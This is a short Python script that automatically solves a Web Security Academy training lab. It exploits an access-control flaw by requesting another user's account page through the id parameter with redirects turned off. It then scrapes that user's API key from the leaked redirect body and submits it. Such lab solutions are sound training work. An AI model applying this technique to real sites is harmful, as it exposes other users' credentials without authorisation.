import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: User ID controlled by request parameter with data leakage in redirect')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.get("https://" + lab.id + ".web-security-academy.net/my-account?id=carlos", allow_redirects=False)
key = re.findall(r'Your API Key is: (.*?)(?=<\/div>)', r.text)[0]
requests.post("https://" + lab.id + ".web-security-academy.net/submitSolution", data={"answer":key})

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")